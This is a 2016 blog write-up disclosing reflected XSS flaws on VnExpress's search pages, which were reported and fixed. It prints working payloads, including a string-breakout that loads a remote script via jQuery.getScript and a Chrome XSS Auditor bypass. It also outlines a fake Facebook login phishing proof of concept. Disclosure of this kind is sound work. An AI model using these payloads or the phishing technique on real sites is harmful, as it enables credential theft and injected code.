+++
Categories = ["security"]
Tags = ["security"]
author = "Cong Nguyen"
authorfacebook = "http://facebook.com/ntcong.it"
authorgoogleplus = "https://plus.google.com/+CongNguyen"
authorlink = "http://ntcong.it"
date = "2016-03-22T16:20:20+07:00"
thumbnail = "/img/vne/vne.jpg"
title = "XSS vulnerabilities on VnExpress"

+++

# XSS on e.vnexpress.net

Recently I found two XSS vulnerabilities on vnExpress website. It all begins with the newly introduced English version of VnExpress, and I didn't have to spend a lot of time to find the search box wasn't escaped properly. Just do a search with "> will reveal this.

{{< figure src="/img/vne/vne1.png" title="XSS on e.VNE" >}}

Pretty serious problem if anyone still doesn't care about escaping user-input, especially on a search box. Luckily, a normal XSS payload will only works on Firefox, because Chrome and IE have XSS Auditor for a while now (you can still bypass it, which I will tell you later). Also because the site doesn't have user account yet, the best I can do is launching a phishing attack (I jut did a PoC to demo what I can do, not really attack anyone).

Phishing is also a serious problem for a big website like VnExpress. People trained to trust VnE and will do most thing the website told them to (like give Facebook's password). So it's pretty simple, I can inject my script in the search page already, I load the main site with jQuery.get, replace the top post with a fake Facebook login, replace the HTML content, and then use window.history.pushState to replace the address bar. This way the site will display the main page with its url, not the search page.

But it's still not very good since it only works on Firefox, so I did a quick look at the HTML source code and found this


{{< highlight js >}}
var strKeyWord  = "">";
var blData      = 0;
{{< /highlight >}}

Why they include the search parameter on a Javascript code, without any protection is beyond me, but this will bypass all the protection XSS Auditor provides to you, because it's not a normal XSS payload anymore, any text you inputed in will run on javascript directly. The new payload will look like this.
{{< highlight js >}}
";alert(1);"
{{< /highlight >}}

And it will not be detected by Chrome or IE's XSS Auditor. Extensible is a must, so I load the script from outside
{{< highlight js >}}
";jQuery.getScript("http://js.js") .done(function() {});"
{{< /highlight >}}

Pretty neat, huh?

What should I do to prevent it? Well XSS is never a simple problem to begin with, but at least never ever trust anything the user input, escape it, whitelist the character, make sure they don't input any special characacter, because no one want to search an article with ";"@(alert(1));" anyway. And NEVER use the input directly onto your javascript, it is very dangerous.


# XSS on vnexpress.net

Then I thought, if they fucked up this bad on their new site, the main site should have some weakness as well. One thing they did a little better is, the main search box is properly escaped, but I noticed they put the whole URL onto the Time and Sort filter, so maybe something will not be escaped, like the "search_f=" parameter.

    http://timkiem.vnexpress.net/?search_f=%22%3E&q=xss&cate_code=&media_type=all&latest=&fromdate=0&todate=0&date_format=all
{{< figure src="/img/vne/vne2.png" title="XSS on VNE" >}}

This time there's no javascript bug on this page, but working only with Firefox is no fun, let's find out how to bypass Chrome.

So Chrome did a great job to find a XSS payload on the URL, and prevent it from running. But there's a flaw: it won't stop an invalid XSS payload, like a script without closing tag. And the HTML parse won't care about the content inside the <script> tag, as long as you include a src attribute. This payload requires you to have a closing </script> tag, which most website nowaday have to execute javascript after the main content finishes loading. The payload looks like this

{{<highlight js>}}
"><script/src=data:,alert(1)%26sol;%26sol;
{{< /highlight >}}

The result html will looks like this: \<script src="data:,alert(1)//&q=xss....">[a lot of HTML]\</script>. Andddd it runs on Chrome. And also it's pretty funny to see VnExpress do some weird shit with their site, results in the alert(1) display several times when the page loads (view count increase maybe?)

Kudos to VnExpress for fixing the bug pretty fast after I reported it to them. But I think they should do something better than having a XSS vuln on the main search box in the first place.
